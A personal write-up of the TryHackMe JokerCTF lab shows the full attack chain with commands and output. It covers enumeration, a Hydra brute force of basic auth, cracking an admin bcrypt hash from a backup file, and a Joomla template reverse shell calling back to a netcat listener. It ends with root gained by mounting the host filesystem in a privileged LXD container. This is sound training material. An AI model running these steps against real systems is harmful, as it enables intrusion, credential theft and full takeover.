JokerCTF

<p align="center">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/ed910d9d7c419b8266128e044a40c7e2.jpeg" style="width:25%;">
</p>
This is my write-up for the room [JokerCTF] (https://tryhackme.com/room/jokerctf)

Description: We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if you have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.

Enumerate Services
- Nmap
Bruteforce
- Performing Bruteforce on files over http
- Performing Bruteforce on Basic Authentication
Hash Crack
- Performing Bruteforce on hash to crack zip file
- Performing Bruteforce on hash to crack mysql user
Exploitation
- Getting a reverse connection
- Spawning a TTY Shell
Privilege Escalation
- Get root taking advantage of flaws in LXD

Difficulty
My Difficulty: Medium (I had no experience with LXD)

Try Hackme Difficulty: Medium




Reconnaissance
Host = 10.10.150.7581.3

Enumeration / Scanning
Let's start with an initial Nmap scan.

Service / Port Enumeration

# NMAP

```console
nmap -sC -sV -A -T4 -Pn 10.10.150.75
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-28 09:30 PDT
Nmap scan report for 10.10.150.75
Host is up (0.15s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: Joker
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.49 seconds
```

We see that ports 22, 80, and 8080 are open

### Browsing to 10.10.150.75

![Screenshot_2022-03-28_09-38-39](https://user-images.githubusercontent.com/68706090/160445902-dcb477e5-c1f4-430d-b5cf-faf68d790464.png)

Going through this page there are a few images with joker quotes, they may come in handy, but lets keep looking for the first secret. 

![Screenshot_2022-03-28_09-40-30](https://user-images.githubusercontent.com/68706090/160446146-5d4e48ac-70ff-44b9-acfe-15c76f66d0ad.png)

There is allot to read in this section, so let start from the top and work our way down. Nothing but a good story, so lets run go buster. I like to start with a common or small wordlist then run a larger one to follow up, just so i can start searching things and then find out if i missed anything. 

# GOBUSTER
```console
gobuster dir -u http://10.10.150.75 -w /home/noob2uub/Documents/Wordlists/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.150.75
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/noob2uub/Documents/Wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/28 09:48:24 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.150.75/css/]
/img                  (Status: 301) [Size: 310] [--> http://10.10.150.75/img/]
/index.html           (Status: 200) [Size: 5954]                              
/phpinfo.php          (Status: 200) [Size: 94768]                             
/server-status        (Status: 403) [Size: 277]                               
                                                                              
===============================================================
2022/03/28 09:49:35 Finished
===============================================================
```

nothing to exciting here so I dedcided to run a 2.3-small.txt and another common.txt scan but for php,html, and txt

```console
gobuster dir -u http://10.10.150.75 -w /home/noob2uub/Documents/Wordlists/common.txt -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.150.75
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/noob2uub/Documents/Wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/03/28 09:52:36 Starting gobuster in directory enumeration mode
===============================================================
/.hta.html            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.150.75/css/]
/img                  (Status: 301) [Size: 310] [--> http://10.10.150.75/img/]
/index.html           (Status: 200) [Size: 5954]                              
/index.html           (Status: 200) [Size: 5954]                              
/phpinfo.php          (Status: 200) [Size: 94768]                             
/phpinfo.php          (Status: 200) [Size: 94768]                             
/secret.txt           (Status: 200) [Size: 320]                               
/server-status        (Status: 403) [Size: 277]                               
                                                                              
===============================================================
2022/03/28 09:57:18 Finished
===============================================================
```
### We find secret.txt that should be something interesting. 

```console
Batman hits Joker.

Joker: "Bats you may be a rock but you won't break me." (Laughs!)

Batman: "I will break you with this rock. You made a mistake now."

Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."

Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```
Nothing to interestesting just an exchange between the two, lets run a .txt search with another word list. Maybe rockyou since he talks about hitting him with a rock?

Ok, that was a waste of time the flag was a bit more obvious then I thought it would be.  

### Browsing to port 8080

We see we have a weblogin available, so lets gather a bit more information on this page. 

![Screenshot_2022-03-28_10-12-29](https://user-images.githubusercontent.com/68706090/160451447-84d63393-782c-438c-bcb9-9bc8beb964b2.png)

Below shows we just have to do basic authentication with hydra using http-get

![Screenshot_2022-03-28_10-32-22](https://user-images.githubusercontent.com/68706090/160454467-2abac213-0e4a-4655-989c-3aae601b86fc.png)

# Hydra

```console
hydra -l joker -P /home/noob2uub/Documents/Wordlists/rockyou.txt -s 8080 -f 10.10.150.75 http-get
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-28 10:30:53
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.150.75:8080/
[8080][http-get] host: 10.10.150.75   login: joker   password: hannah
[STATUS] attack finished for 10.10.150.75 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-28 10:31:25
```
Navigating to the site we notice that there isn't much listed here other then its a CMS Blog on Joomla. The default Adminitrative page for joomla is /administrator and that takes us to a new log in. Other ways you can find the admin page is from running a nikto scan or looking at the robots.txt page.

# Robots.txt
```console
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
# Nikto

```console
nikto -host 10.10.150.75 -port 8080 -id joker:hannah
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.150.75
+ Target Hostname:    10.10.150.75
+ Target Port:        8080
+ Start Time:         2022-03-28 10:41:18 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm ' Please enter the password.'
+ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.

+ Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 14 entries which should be manually viewed.
+ /backup.zip: Potentially interesting archive/cert file found.
+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
```

However, it is good that I ran the nikto scan just to highlight how to find the additional page because the Joker's credentials did not work for the admin login. 

![Screenshot_2022-03-28_10-46-37](https://user-images.githubusercontent.com/68706090/160459500-7fba67a7-7942-49aa-97c8-7a3a0ac9978d.png)

I did notice that there is a backup.zip file from the nikto scan, so its a good thing that I did not stop it to early. Also its a good thing that the Joker resuses passes works. You could also brute force it with john if you wanted to. 

![Screenshot_2022-03-28_10-49-42](https://user-images.githubusercontent.com/68706090/160459669-ab7527f2-7333-4e43-8e29-6c727ca9e6ae.png)

I see the file is a backup SQL SB file, so I open it in sublime text and earch for and type of admin credentials. 

```console
LOCK TABLES `cc1gr_users` WRITE;
/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
UNLOCK TABLES;
```

We have a hash that now we have to start cracking 

Hash = `$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG'

now lets use john to get through it

### John

```console
sudo john pass.txt /home/noob2uub/Documents/Wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
abcd1234         (?)     
1g 0:00:00:04 DONE 2/3 (2022-03-28 11:26) 0.2475g/s 187.1p/s 187.1c/s 187.1C/s yellow..baby
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We now have the password and can log into the admin page of the site, lets look for a reverse shell. 

I found this page, let see what I can do with it

https://www.hackingarticles.in/joomla-reverse-shell/

Start Netcat listener and then edit the template with the reverse shell provided by pentest monkey. Then select preview to launch the reverse shell

![Screenshot_2022-03-28_11-38-24](https://user-images.githubusercontent.com/68706090/160464457-0890f5cd-15dc-48a4-b2d4-6f51ff384127.png)

# Netcat

```console
nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.13.27.142] from (UNKNOWN) [10.10.83.0] 46256
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 11:41:53 up 30 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 1: python: not found
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 2: python: not found
$ whoami
www-data
$ 
```

run, to spawn a tty shell

python3 -c 'import pty; pty.spawn("/bin/bash");'

Doing some more research on LXD there should be images within the containers. So lets take a look at what images are listed.

```console
www-data@ubuntu:/$ lxc image list images
lxc image list images
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
www-data@ubuntu:/$ 
```

I do not see any images, so lets start looking into how to privledge escalate LXD

sure enough I find this article https://www.hackingarticles.in/lxd-privilege-escalation/ which is also the same website that was linked on the main page of the box. Must be the authors personal page. 

This page highlights a ton of great information on LXD including an Priveledge Escalation walkthrough 

# Priveledge Escalation LXD

```console
noob2uub@kali:~$ git clone  https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
Unpacking objects: 100% (50/50), 3.11 MiB | 8.61 MiB/s, done.
noob2uub@kali:~$ cd lxd-alpine-builder
noob2uub@kali:~/lxd-alpine-builder$ ./build-alpine
build-alpine: must be run as root
noob2uub@kali:~/lxd-alpine-builder$ sudo ./build-alpine
[sudo] password for noob2uub: 
Determining the latest release... v3.15
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.15/main/x86_64
Downloading alpine-keys-2.4-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.12.7-r3.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
Verified OK
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2498  100  2498    0     0    940      0  0:00:02  0:00:02 --:--:--   940
--2022-03-28 12:12:13--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2498 (2.4K) [text/plain]
Saving to: ‘/home/noob2uub/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’

/home/noob2uub/lxd- 100%[===================>]   2.44K  --.-KB/s    in 0s      

2022-03-28 12:12:14 (58.6 MB/s) - ‘/home/noob2uub/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2498/2498]

Selecting mirror http://dl-cdn.alpinelinux.org/alpine//v3.15/main
fetch http://dl-cdn.alpinelinux.org/alpine//v3.15/main/x86_64/APKINDEX.tar.gz
(1/20) Installing musl (1.2.2-r7)
(2/20) Installing busybox (1.34.1-r4)
Executing busybox-1.34.1-r4.post-install
(3/20) Installing alpine-baselayout (3.2.0-r18)
Executing alpine-baselayout-3.2.0-r18.pre-install
Executing alpine-baselayout-3.2.0-r18.post-install
(4/20) Installing ifupdown-ng (0.11.3-r0)
(5/20) Installing openrc (0.44.7-r5)
Executing openrc-0.44.7-r5.post-install
(6/20) Installing alpine-conf (3.13.1-r0)
(7/20) Installing ca-certificates-bundle (20211220-r0)
(8/20) Installing libcrypto1.1 (1.1.1n-r0)
(9/20) Installing libssl1.1 (1.1.1n-r0)
(10/20) Installing libretls (3.3.4-r3)
(11/20) Installing ssl_client (1.34.1-r4)
(12/20) Installing zlib (1.2.12-r0)
(13/20) Installing apk-tools (2.12.7-r3)
(14/20) Installing busybox-suid (1.34.1-r4)
(15/20) Installing busybox-initscripts (4.0-r5)
Executing busybox-initscripts-4.0-r5.post-install
(16/20) Installing scanelf (1.3.3-r0)
(17/20) Installing musl-utils (1.2.2-r7)
(18/20) Installing libc-utils (0.7.2-r3)
(19/20) Installing alpine-keys (2.4-r1)
(20/20) Installing alpine-base (3.15.2-r0)
Executing busybox-1.34.1-r4.trigger
OK: 9 MiB in 20 packages
```

So we pulled all of the files over to our local machine, now lets try to get them over to the box and transfer the files over to box. I see two files that are tar.gz, lets start with 0139

```console
noob2uub@kali:~/lxd-alpine-builder$ ls
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  README.md
alpine-v3.15-x86_64-20220328_1212.tar.gz  LICENSE
noob2uub@kali:~/lxd-alpine-builder$
```

# Starting webserver

```console
noob2uub@kali:~/lxd-alpine-builder$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

# WGET 

```console
www-data@ubuntu:/tmp$ wget http://10.13.27.142:80/alpine-v3.13-x86_64-20210218_0139.tar.gz
<.27.142:80/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2022-03-28 12:19:43--  http://10.13.27.142/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.13.27.142:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: 'alpine-v3.13-x86_64-20210218_0139.tar.gz'

alpine-v3.13-x86_64 100%[===================>]   3.11M  1.36MB/s    in 2.3s    

2022-03-28 12:19:46 (1.36 MB/s) - 'alpine-v3.13-x86_64-20210218_0139.tar.gz' saved [3259593/3259593]
```
### Importing LXD container

```console
www-data@ubuntu:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
<e-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
www-data@ubuntu:/tmp$ lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Mar 28, 2022 at 7:20pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
```

# Completing Priveledge Escalation 

```console
www-data@ubuntu:/tmp$ lxc init myimage ignite -c security.privileged=true
lxc init myimage ignite -c security.privileged=true
Creating ignite
www-data@ubuntu:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
www-data@ubuntu:/tmp$ lxc start ignite
lxc start ignite
www-data@ubuntu:/tmp$ lxc exec ignite /bin/sh
lxc exec ignite /bin/sh
~ # id      
id
uid=0(root) gid=0(root)
~ # cd /root
cd /root
~ # ls      
ls
~ # mnt/root/root
mnt/root/root
/bin/sh: mnt/root/root: not found
~ # ls      
ls
~ # id      
id
uid=0(root) gid=0(root)
~ # cd /mnt 
cd /mnt
/mnt # ^[[41;8Rls
ls
root
/mnt # ls      
ls
root
/mnt # ^[[41;8R cd root
 cd root
/mnt/root # ^[[41;13Rls
ls
bin             lib             root            usr
boot            lib64           run             var
dev             lost+found      sbin            vmlinuz
etc             media           srv             vmlinuz.old
home            mnt             swapfile
initrd.img      opt             sys
initrd.img.old  proc            tmp
/mnt/root # ^[[41;13Rcd root
cd root
/mnt/root/root # ^[[41;18Rls
ls
final.txt
/mnt/root/root # ^[[41;18Rcat *****
cat ********

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!		
							
Contact us here:						
								
Hacking Articles : https://twitter.com/rajchandel/		
Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114			
								
+-+-+-+-+-+ +-+-+-+-+-+-+-+					
 |E|n|j|o|y| |H|A|C|K|I|N|G|			
 +-+-+-+-+-+ +-+-+-+-+-+-+-+	
/mnt/root/root # ^[[41;18R

```

I did notice the shell was a bit wonky and I couldnt get rid of those characters. I am not sure if it was something that I did or just how it works. However, we have root and this was a fun box. 








